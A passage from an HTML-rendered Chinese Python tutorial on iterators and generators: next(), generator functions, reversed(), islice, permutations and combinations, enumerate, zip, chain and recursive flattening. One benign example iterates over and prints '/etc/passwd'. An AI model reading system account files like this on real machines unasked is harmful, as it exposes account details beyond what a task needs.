class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">manual_iter</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'/etc/passwd'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                line = next(f)</span><br><span class="line">                print(line, end=<span class="string">''</span>)</span><br><span class="line">        <span class="keyword">except</span> StopIteration:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">a = iter(a)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        b = next(a)</span><br><span class="line">        print(b, end=<span class="string">' '</span>)</span><br><span class="line"><span class="keyword">except</span> StopIteration:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h4 id="使用生成器创建新的迭代模式"><a href="#使用生成器创建新的迭代模式" class="headerlink" title="使用生成器创建新的迭代模式"></a>使用生成器创建新的迭代模式</h4><p>如果想实现一种新的迭代模式，使用一个生成器函数来定义它，如下是一个生产某个范围内浮点数的生成器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">frange</span><span class="params">(start, stop, increment)</span>:</span></span><br><span class="line">    x = start</span><br><span class="line">    <span class="keyword">while</span> x &lt; stop:</span><br><span class="line">        <span class="keyword">yield</span> x</span><br><span class="line">        x += increment</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> frange(<span class="number">0</span>, <span class="number">4</span>, <span class="number">0.5</span>):</span><br><span class="line">    print(n)</span><br><span class="line"></span><br><span class="line">print(list(frange(<span class="number">0</span>, <span class="number">4</span>, <span class="number">0.5</span>)))</span><br></pre></td></tr></table></figure><p>一个生成器函数主要特征是它只会回应在迭代中使用到的<code>next</code>操作。 一旦生成器函数返回退出，迭代终止。我们在迭代中通常使用的<code>for</code>语句会自动处理这些细节</p><h4 id="反向迭代"><a href="#反向迭代" class="headerlink" title="反向迭代"></a>反向迭代</h4><p>使用内置的<code>reversed()</code>函数，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> x <span class="keyword">in</span> reversed(a):</span><br><span class="line"><span class="meta">... </span>    print(x)</span><br><span class="line">...</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="迭代器切片"><a href="#迭代器切片" class="headerlink" title="迭代器切片"></a>迭代器切片</h4><p>如果想得到一个由迭代器生成的切片对象，但是标准切片操作并不能做到，可以使用<code>itertools.islice()</code>做切片操作，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">yield</span> n</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line">c = count(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#标准切片报错</span></span><br><span class="line">c[<span class="number">10</span>:<span class="number">20</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"test.py"</span>, line <span class="number">11</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: <span class="string">'generator'</span> object <span class="keyword">is</span> <span class="keyword">not</span> subscriptable</span><br><span class="line"><span class="comment">#使用itertools.islice()操作</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> itertools.islice(c, <span class="number">10</span>, <span class="number">20</span>):</span><br><span class="line">    print(x)</span><br></pre></td></tr></table></figure><p>迭代器和生成器不能使用标准的切片操作，因为它们的长度事先我们并不知道(并且也没有实现索引)。 函数<code>islice()</code>返回一个可以生成指定元素的迭代器，它通过遍历并丢弃直到切片开始索引位置的所有元素。 然后才开始一个个的返回元素，并直到切片结束索引位置。这里要着重强调的一点是<code>islice()</code>会消耗掉传入的迭代器中的数据。必须考虑到迭代器是不可逆的这个事实。如果你需要之后再次访问这个迭代器的话，那你就得先将它里面的数据放入一个列表中。</p><h4 id="排列组合的迭代"><a href="#排列组合的迭代" class="headerlink" title="排列组合的迭代"></a>排列组合的迭代</h4><p>如果想迭代遍历一个集合中元素的所有可能的排列组合，<code>itertools</code>提供了三个函数来解决这类问题，其中一个是<code>itertools.permutations()</code>，它接受一个集合并产生一个元组序列，每个元组由集合中所有元素的一个可能排列组成。 也就是说通过打乱集合中元素排列顺序生成一个元组，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>items = [<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> p <span class="keyword">in</span> permutations(items):</span><br><span class="line"><span class="meta">... </span>    print(p)</span><br><span class="line">...</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>)</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'c'</span>, <span class="string">'b'</span>)</span><br><span class="line">(<span class="string">'b'</span>, <span class="string">'a'</span>, <span class="string">'c'</span>)</span><br><span class="line">(<span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'a'</span>)</span><br><span class="line">(<span class="string">'c'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>)</span><br><span class="line">(<span class="string">'c'</span>, <span class="string">'b'</span>, <span class="string">'a'</span>)</span><br></pre></td></tr></table></figure><p>如果想得到指定长度的所有排列，可以传递一个可选的长度参数，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>items = [<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> p <span class="keyword">in</span> permutations(items,<span class="number">2</span>):</span><br><span class="line"><span class="meta">... </span>    print(p)</span><br><span class="line">...</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'b'</span>)</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'c'</span>)</span><br><span class="line">(<span class="string">'b'</span>, <span class="string">'a'</span>)</span><br><span class="line">(<span class="string">'b'</span>, <span class="string">'c'</span>)</span><br><span class="line">(<span class="string">'c'</span>, <span class="string">'a'</span>)</span><br><span class="line">(<span class="string">'c'</span>, <span class="string">'b'</span>)</span><br></pre></td></tr></table></figure><p>使用<code>itertools.combinations()</code>可得到输入集合中元素的所有组合，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> itertools <span class="keyword">import</span> combinations</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>items = [<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> c <span class="keyword">in</span> combinations(items,<span class="number">3</span>):</span><br><span class="line"><span class="meta">... </span>    print(c)</span><br><span class="line">...</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> c <span class="keyword">in</span> combinations(items,<span class="number">2</span>):</span><br><span class="line"><span class="meta">... </span>    print(c)</span><br><span class="line">...</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'b'</span>)</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'c'</span>)</span><br><span class="line">(<span class="string">'b'</span>, <span class="string">'c'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> c <span class="keyword">in</span> combinations(items,<span class="number">1</span>):</span><br><span class="line"><span class="meta">... </span>    print(c)</span><br><span class="line">...</span><br><span class="line">(<span class="string">'a'</span>,)</span><br><span class="line">(<span class="string">'b'</span>,)</span><br><span class="line">(<span class="string">'c'</span>,)</span><br></pre></td></tr></table></figure><p>对于<code>combinations()</code>来讲，元素顺序已经不重要了，也就是说，<code>(&#39;a&#39;,&#39;b&#39;)</code>和<code>(&#39;b&#39;,&#39;a&#39;)</code>是一样的。</p><p>在计算组合的时候，一旦元素被选取就会从后选中剔除掉，而函数<code>itertools.combinations_with_replacement()</code>允许同一个元素被选择多次，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> itertools <span class="keyword">import</span> combinations_with_replacement</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>items = [<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> c <span class="keyword">in</span> combinations_with_replacement(items,<span class="number">3</span>):</span><br><span class="line"><span class="meta">... </span>    print(c)</span><br><span class="line">...</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">'a'</span>)</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>)</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">'c'</span>)</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'b'</span>)</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>)</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'c'</span>, <span class="string">'c'</span>)</span><br><span class="line">(<span class="string">'b'</span>, <span class="string">'b'</span>, <span class="string">'b'</span>)</span><br><span class="line">(<span class="string">'b'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>)</span><br><span class="line">(<span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'c'</span>)</span><br><span class="line">(<span class="string">'c'</span>, <span class="string">'c'</span>, <span class="string">'c'</span>)</span><br></pre></td></tr></table></figure><h4 id="序列上索引值迭代"><a href="#序列上索引值迭代" class="headerlink" title="序列上索引值迭代"></a>序列上索引值迭代</h4><p>一般内置的<code>enumerate()</code>函数可以很好的处理该问题，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> idx,val <span class="keyword">in</span> enumerate(a):</span><br><span class="line"><span class="meta">... </span>    print(idx,val)</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span> a</span><br><span class="line"><span class="number">1</span> b</span><br><span class="line"><span class="number">2</span> c</span><br></pre></td></tr></table></figure><p>为了按照传统行号输出，可以传递一个开始参数，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> idx,val <span class="keyword">in</span> enumerate(a,<span class="number">1</span>):</span><br><span class="line"><span class="meta">... </span>    print(idx,val)</span><br><span class="line">...</span><br><span class="line"><span class="number">1</span> a</span><br><span class="line"><span class="number">2</span> b</span><br><span class="line"><span class="number">3</span> c</span><br></pre></td></tr></table></figure><p>这种情况在你遍历文件时想在错误消息中使用行号定位时非常有用，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_data</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">'rt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> lineno, line <span class="keyword">in</span> enumerate(f, <span class="number">1</span>):</span><br><span class="line">            fields = line.split()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                count = int(fields[<span class="number">1</span>])</span><br><span class="line">                ...</span><br><span class="line">            <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="string">'Line &#123;&#125;: Parse error: &#123;&#125;'</span>.format(lineno, e))</span><br></pre></td></tr></table></figure><p>还有一点可能并不很重要，但是也值得注意， 有时候当你在一个已经解压后的元组序列上使用<code>enumerate()</code>函数时很容易调入陷阱。 你得像下面正确的方式这样写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data = [ (<span class="number">1</span>, <span class="number">2</span>), (<span class="number">3</span>, <span class="number">4</span>), (<span class="number">5</span>, <span class="number">6</span>), (<span class="number">7</span>, <span class="number">8</span>) ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Correct!</span></span><br><span class="line"><span class="keyword">for</span> n, (x, y) <span class="keyword">in</span> enumerate(data):</span><br><span class="line">    ...</span><br><span class="line"><span class="comment"># Error!</span></span><br><span class="line"><span class="keyword">for</span> n, x, y <span class="keyword">in</span> enumerate(data):</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><h4 id="同时迭代多个序列"><a href="#同时迭代多个序列" class="headerlink" title="同时迭代多个序列"></a>同时迭代多个序列</h4><p>为了同时迭代多个序列，可以使用<code>zip()</code>函数，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b =[<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">10</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> x,y <span class="keyword">in</span> zip(a,b):</span><br><span class="line"><span class="meta">... </span>    print(x,y)</span><br><span class="line">...</span><br><span class="line"><span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="number">5</span> <span class="number">6</span></span><br><span class="line"><span class="number">7</span> <span class="number">8</span></span><br><span class="line"><span class="number">9</span> <span class="number">10</span></span><br></pre></td></tr></table></figure><p><code>zip(a, b)</code>会生成一个可返回元组<code>(x, y)</code>的迭代器，其中<code>x</code>来自<code>a</code>，<code>y</code>来自<code>b</code>。 一旦其中某个序列到底结尾，迭代宣告结束。 因此迭代长度跟参数中最短序列长度一致。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = [<span class="string">'e'</span>,<span class="string">'l'</span>,<span class="string">'s'</span>,<span class="string">'s'</span>,<span class="string">'m'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> zip(a,b):</span><br><span class="line"><span class="meta">... </span>    print(i)</span><br><span class="line">...</span><br><span class="line">(<span class="number">1</span>, <span class="string">'e'</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="string">'l'</span>)</span><br><span class="line">(<span class="number">5</span>, <span class="string">'s'</span>)</span><br></pre></td></tr></table></figure><p>如果不希望和最短序列保持一致，可以使用<code>itertools.zip_longest()</code>函数来代替，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = [<span class="string">'e'</span>,<span class="string">'l'</span>,<span class="string">'s'</span>,<span class="string">'s'</span>,<span class="string">'m'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> itertools <span class="keyword">import</span> zip_longest</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> zip_longest(a,b):</span><br><span class="line"><span class="meta">... </span>    print(i)</span><br><span class="line">...</span><br><span class="line">(<span class="number">1</span>, <span class="string">'e'</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="string">'l'</span>)</span><br><span class="line">(<span class="number">5</span>, <span class="string">'s'</span>)</span><br><span class="line">(<span class="literal">None</span>, <span class="string">'s'</span>)</span><br><span class="line">(<span class="literal">None</span>, <span class="string">'m'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> zip_longest(a,b,fillvalue=<span class="number">0</span>):</span><br><span class="line"><span class="meta">... </span>    print(i)</span><br><span class="line">...</span><br><span class="line">(<span class="number">1</span>, <span class="string">'e'</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="string">'l'</span>)</span><br><span class="line">(<span class="number">5</span>, <span class="string">'s'</span>)</span><br><span class="line">(<span class="number">0</span>, <span class="string">'s'</span>)</span><br><span class="line">(<span class="number">0</span>, <span class="string">'m'</span>)</span><br></pre></td></tr></table></figure><p>使用<code>zip()</code>函数可以将数据打包并生成一个字典，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>key=[<span class="string">'name'</span>,<span class="string">'age'</span>,<span class="string">'sex'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>value = [<span class="string">'elssm'</span>,<span class="string">'24'</span>,<span class="string">'男'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = dict(zip(key,value))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line">&#123;<span class="string">'name'</span>: <span class="string">'elssm'</span>, <span class="string">'age'</span>: <span class="string">'24'</span>, <span class="string">'sex'</span>: <span class="string">'男'</span>&#125;</span><br></pre></td></tr></table></figure><p>最后强调一点就是，<code>zip()</code>会创建一个迭代器来作为结果返回。 如果你需要将结对的值存储在列表中，要使用<code>list()</code>函数。示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b =[<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">10</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>zip(a,b)</span><br><span class="line">&lt;zip object at <span class="number">0x00000254B2799640</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>list(zip(a,b))</span><br><span class="line">[(<span class="number">1</span>, <span class="number">2</span>), (<span class="number">3</span>, <span class="number">4</span>), (<span class="number">5</span>, <span class="number">6</span>), (<span class="number">7</span>, <span class="number">8</span>), (<span class="number">9</span>, <span class="number">10</span>)]</span><br></pre></td></tr></table></figure><h4 id="不同集合上元素的迭代"><a href="#不同集合上元素的迭代" class="headerlink" title="不同集合上元素的迭代"></a>不同集合上元素的迭代</h4><p><code>itertools.chain()</code>方法接受一个可迭代对象列表作为输入，并返回一个迭代器，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = [<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> x <span class="keyword">in</span> chain(a,b):</span><br><span class="line"><span class="meta">... </span>    print(x)</span><br><span class="line">...</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line">x</span><br><span class="line">y</span><br><span class="line">z</span><br></pre></td></tr></table></figure><p>使用<code>chain</code>的一个常见场景是当你相对不同的集合中所有元素执行某些操作时，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">active_items = set()</span><br><span class="line">inactive_items = set()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Iterate over all items</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> chain(active_items, inactive_items):</span><br><span class="line">    <span class="comment"># Process item</span></span><br></pre></td></tr></table></figure><p>这种解决方案要比使用两个单独的循环处理更加优雅。</p><h4 id="展开嵌套的序列"><a href="#展开嵌套的序列" class="headerlink" title="展开嵌套的序列"></a>展开嵌套的序列</h4><p>如果想将一个多层嵌套的序列展开成一个单层列表，可以写一个包含<code>yield from</code>语句的递归生成器来处理，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections.abc <span class="keyword">import</span> Iterable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flatten</span><span class="params">(item, ignore_types=<span class="params">(str, bytes)</span>)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> item:</span><br><span class="line">        <span class="keyword">if</span> isinstance(x, Iterable) <span class="keyword">and</span> <span class="keyword">not</span> isinstance(x, ignore_types):</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> flatten(x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">yield</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">items = [<span class="number">1</span>, <span class="number">2</span>, [<span class="number">3</span>, <span class="number">4</span>, [<span class="number">5</span>, <span class="number">6</span>], <span class="number">7</span>], <span class="number">8</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flatten(items):</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure><p>在上述代码中，<code>isinstance(x,Iterable)</code>检查某个元素是否是可迭代的，如果是，<code>yield from</code>就会返回所有子例程的值，最终返回结果就是一个没有嵌套的简单序列，额外的参数<code>ignore_types</code>和检测语句<code>isinstance(x,ignore_types)</code>用来将字符串和字节排除在可迭代对象外，防止将它们再展开成单个字符，示例如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections.abc <span class="keyword">import</span> Iterable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flatten</span><span class="params">(item, ignore_types=<span class="params">(str, bytes)</span>)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> item:</span><br><span class="line">        <span class="keyword">if</span> isinstance(x, Iterable) <span class="keyword">and</span> <span class="keyword">not</span> isinstance(x, ignore_types):</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> flatten(x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">yield</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">items = [<span class="string">'Dave'</span>, <span class="string">'Paula'</span>, [<span class="string">'Thomas'</span>, <span class="string">'Lewis'</span>]]</span><br><span class="line"><span class="keyword">for</span> i <span 